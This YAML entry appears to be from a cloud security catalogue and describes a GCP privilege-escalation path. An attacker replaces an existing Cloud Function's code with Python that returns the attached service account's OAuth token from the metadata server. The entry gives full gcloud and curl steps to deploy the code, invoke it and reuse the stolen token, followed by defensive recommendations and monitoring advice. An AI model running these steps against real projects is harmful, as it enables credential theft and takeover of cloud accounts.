id: gcp-cloudfunctions-002
name: iam.serviceAccounts.actAs + cloudfunctions.functions.update + run.routes.invoke
category: existing-passrole
services:
- iam
- cloudfunctions
- run
permissions:
  required:
  - permission: iam.serviceAccounts.actAs
    resourceConstraints: Must be granted on both the function's existing runtime service account and its Cloud Build service account; one grant is sufficient when both roles use the same service account
  - permission: cloudfunctions.functions.update
    resourceConstraints: Must be granted on an existing second-generation Cloud Function that runs as the target service account
  - permission: cloudfunctions.functions.sourceCodeSet
    resourceConstraints: Must be granted on the target function to obtain a signed upload URL for attacker-controlled replacement source code
  - permission: cloudfunctions.operations.get
    resourceConstraints: Required to poll the asynchronous update operation until the replacement code is active and retrieve the function's invocation URI
  - permission: run.routes.invoke
    resourceConstraints: Must allow the attacker to invoke the second-generation function's underlying Cloud Run service
  additional:
  - permission: cloudfunctions.functions.get
    resourceConstraints: Required only by `gcloud functions deploy`, which reads the current function configuration and retrieves its URI; not needed via the REST API
  - permission: resourcemanager.projects.get
    resourceConstraints: Required only by `gcloud functions deploy`, which reads project metadata as a preflight; not needed via the REST API
  - permission: cloudfunctions.functions.list
    resourceConstraints: Helpful for enumerating existing functions and identifying one that runs as a privileged service account
  - permission: iam.serviceAccounts.list
    resourceConstraints: Helpful for enumerating service accounts in the project and identifying high-value runtime identities
  - permission: iam.serviceAccounts.getIamPolicy
    resourceConstraints: Useful for inspecting IAM policy bindings on candidate service accounts and determining whether the attacker holds `iam.serviceAccounts.actAs`
description: A principal with `cloudfunctions.functions.update`, `cloudfunctions.functions.sourceCodeSet`, `iam.serviceAccounts.actAs`, and `run.routes.invoke` can replace the code of an existing second-generation Cloud Function that already runs as a more privileged service account, invoke the malicious replacement, and retrieve the attached service account's OAuth access token from the metadata server. GCP enforces `iam.serviceAccounts.actAs` against both the function's runtime and Cloud Build service accounts during the build configuration update, even when those identities are unchanged.
prerequisites:
  admin:
  - An existing second-generation Cloud Function must run as a service account on which the attacker holds `iam.serviceAccounts.actAs`
  - The attacker must also hold `iam.serviceAccounts.actAs` on the function's existing Cloud Build service account, unless it is the same account as the runtime identity
  - The attached runtime service account must hold `roles/owner`, `roles/editor`, or an equivalent administrative custom role
  - The attacker must be able to update the function's source and invoke its underlying Cloud Run service
  lateral:
  - An existing second-generation Cloud Function must run as a service account on which the attacker holds `iam.serviceAccounts.actAs`
  - The attacker must also hold `iam.serviceAccounts.actAs` on the function's existing Cloud Build service account, unless it is the same account as the runtime identity
  - The attached runtime service account must hold permissions that provide useful access beyond the attacker's starting principal
exploitationSteps:
  gcloud:
  - step: 1
    command: |
      gcloud functions list --gen2 \
        --regions=REGION \
        --format='table(name,state,serviceConfig.serviceAccountEmail)'
    description: Identify an existing second-generation function that runs as a privileged service account. This reconnaissance uses the additional `cloudfunctions.functions.list` permission.
  - step: 2
    command: |
      mkdir -p /tmp/function-exfil && cd /tmp/function-exfil
      cat > main.py <<'PYEOF'
      import json
      import urllib.request

      def exfiltrate_token(request):
          request = urllib.request.Request(
              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
              headers={"Metadata-Flavor": "Google"},
          )
          with urllib.request.urlopen(request, timeout=5) as response:
              return (json.dumps(json.loads(response.read())), 200, {"Content-Type": "application/json"})
      PYEOF
      printf 'functions-framework==3.*\n' > requirements.txt
    description: Create replacement function code that returns the OAuth access token of the function's attached service account
  - step: 3
    command: |
      gcloud functions deploy FUNCTION_NAME \
        --gen2 \
        --runtime=python312 \
        --region=REGION \
        --source=/tmp/function-exfil \
        --entry-point=exfiltrate_token \
        --trigger-http \
        --service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
        --build-service-account=projects/PROJECT_ID/serviceAccounts/BUILD_SA@PROJECT_ID.iam.gserviceaccount.com \
        --format=json
    description: Replace the existing function's code while retaining its privileged runtime identity and existing usable Cloud Build service account. The attacker needs `iam.serviceAccounts.actAs` on both `TARGET_SA` and `BUILD_SA` when they differ. `BUILD_SA` must already have the source-storage, logging, artifact, and build permissions required by Cloud Build. In addition to the required permission set, `gcloud functions deploy` needs the additional `cloudfunctions.functions.get` and `resourcemanager.projects.get` permissions.
  - step: 4
    command: |
      FUNCTION_URL=$(gcloud functions describe FUNCTION_NAME \
        --gen2 \
        --region=REGION \
        --format='value(serviceConfig.uri)')
      ID_TOKEN=$(gcloud auth print-identity-token --audiences="$FUNCTION_URL")
      FUNCTION_RESPONSE=$(curl -sS -H "Authorization: Bearer $ID_TOKEN" "$FUNCTION_URL")
      EXFILTRATED_TOKEN=$(echo "$FUNCTION_RESPONSE" | jq -r '.access_token')
      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
    description: Invoke the updated function, extract the attached service account's token, and use the token directly against Google APIs. The separate describe call uses the additional `cloudfunctions.functions.get` permission.
  curl:
  - step: 1
    command: |
      mkdir -p /tmp/function-exfil && cd /tmp/function-exfil
      cat > main.py <<'PYEOF'
      import json
      import urllib.request

      def exfiltrate_token(request):
          request = urllib.request.Request(
              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
              headers={"Metadata-Flavor": "Google"},
          )
          with urllib.request.urlopen(request, timeout=5) as response:
              return (json.dumps(json.loads(response.read())), 200, {"Content-Type": "application/json"})
      PYEOF
      printf 'functions-framework==3.*\n' > requirements.txt
      zip -qr source.zip main.py requirements.txt
      ACCESS_TOKEN=$(gcloud auth print-access-token)
    description: Package the malicious replacement source and obtain a bearer token for the attacking principal
  - step: 2
    command: |
      UPLOAD_RESPONSE=$(curl -sS -X POST \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{}' \
        "https://cloudfunctions.googleapis.com/v2/projects/PROJECT_ID/locations/REGION/functions:generateUploadUrl")
      UPLOAD_URL=$(echo "$UPLOAD_RESPONSE" | jq -r '.uploadUrl')
      UPLOAD_BUCKET=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.bucket')
      UPLOAD_OBJECT=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.object')
      curl -sS -X PUT \
        -H "Content-Type: application/zip" \
        --data-binary @source.zip \
        "$UPLOAD_URL"
    description: Request a signed upload URL with `cloudfunctions.functions.sourceCodeSet` and upload the malicious archive without requiring a separate Cloud Storage permission
  - step: 3
    command: |
      UPDATE_RESPONSE=$(curl -sS -X PATCH \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "Content-Type: application/json" \
        "https://cloudfunctions.googleapis.com/v2/projects/PROJECT_ID/locations/REGION/functions/FUNCTION_NAME?updateMask=buildConfig.source,buildConfig.entryPoint" \
        -d "{
          \"buildConfig\": {
            \"entryPoint\": \"exfiltrate_token\",
            \"source\": {\"storageSource\": {\"bucket\": \"$UPLOAD_BUCKET\", \"object\": \"$UPLOAD_OBJECT\"}}
          }
        }")
      OPERATION_NAME=$(echo "$UPDATE_RESPONSE" | jq -r '.name')
    description: Replace only the function's source and entry point with `cloudfunctions.functions.update`; the API still checks `iam.serviceAccounts.actAs` on the function's unchanged runtime and Cloud Build service accounts
  - step: 4
    command: |
      while true; do
        OPERATION=$(curl -sS \
          -H "Authorization: Bearer $ACCESS_TOKEN" \
          "https://cloudfunctions.googleapis.com/v2/$OPERATION_NAME")
        [ "$(echo "$OPERATION" | jq -r '.done // false')" = "true" ] && break
        sleep 10
      done
      FUNCTION_URL=$(echo "$OPERATION" | jq -r '.response.serviceConfig.uri')
    description: Poll the update operation with `cloudfunctions.operations.get` and obtain the invocation URI from the completed response
  - step: 5
    command: |
      ID_TOKEN=$(gcloud auth print-identity-token --audiences="$FUNCTION_URL")
      FUNCTION_RESPONSE=$(curl -sS \
        -H "Authorization: Bearer $ID_TOKEN" \
        "$FUNCTION_URL")
      EXFILTRATED_TOKEN=$(echo "$FUNCTION_RESPONSE" | jq -r '.access_token')
      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
    description: Invoke the updated function using `run.routes.invoke`, extract the attached service account's OAuth token, and use it directly against Google APIs
recommendation: |
  High powered service accounts + overly broad `iam.serviceAccounts.actAs` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid privileged service accounts on Cloud Functions** - Very rarely does a Cloud Function need `roles/editor` or `roles/owner`. Give each function a dedicated service account with only the roles it needs.
  - **Separate deployment permissions from privileged runtime identities** - Do not grant the same principal both `cloudfunctions.functions.update` on a production function and `iam.serviceAccounts.actAs` on its attached service account. Treat that combination as equivalent to permission to run arbitrary code as the service account.
  - **Grant `iam.serviceAccounts.actAs` on specific service accounts, not the project** - Bind `roles/iam.serviceAccountUser` or a custom role on only the service accounts a deployer legitimately needs.
  Use IAM Conditions to narrow the grant further:

  ```json
  {
    "role": "roles/iam.serviceAccountUser",
    "members": ["serviceAccount:deployer@PROJECT_ID.iam.gserviceaccount.com"],
    "condition": {
      "title": "deploy-window-only",
      "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
    }
  }
  ```

  - Monitor Cloud Audit Logs for `google.cloud.functions.v2.FunctionService.UpdateFunction` events that replace source code or an entry point, especially when the caller is not the expected CI/CD identity.
  - Correlate source upload URL generation and function updates from the same principal with invocation of the function and subsequent API activity by its attached service account.
  - Monitor for `google.iam.admin.v1.SetIAMPolicy` events on service accounts that grant `iam.serviceAccounts.actAs`, especially at project scope.
  - Alert when a principal updates a function whose attached service account has permissions the principal does not otherwise possess.
  - Regularly audit which service accounts Cloud Functions run as and down-scope any with `roles/editor` or `roles/owner`.
  - Use IAM Recommender and Policy Analyzer to find unused or overly broad `actAs` grants.
limitations: |
  This path requires an existing second-generation Cloud Function whose attached runtime service account is both useful to the attacker and covered by the attacker's `iam.serviceAccounts.actAs` grant. Cloud Functions also checks `iam.serviceAccounts.actAs` on the function's Cloud Build service account during a build configuration update; when the build and runtime identities differ, the attacker needs the grant on both. The path does not let the attacker select an arbitrary runtime identity unless it is already attached to a function the attacker can update, or the attacker also has permissions to change the function's runtime configuration.

  Administrative impact depends entirely on the attached runtime service account's roles. A narrowly scoped runtime identity yields only those permissions. The `gcloud` example also requires the existing `BUILD_SA` to remain a usable custom Cloud Build service account with the necessary source-storage, logging, artifact, and build permissions; the raw PATCH example retains the function's existing build identity but still requires `iam.serviceAccounts.actAs` on it. The attacker must also be able to invoke the updated function through `run.routes.invoke`. Replacing production code can cause an outage or create an obvious integrity signal, and the stolen OAuth token is short-lived, although the attacker can invoke the compromised function again while the malicious code remains deployed.
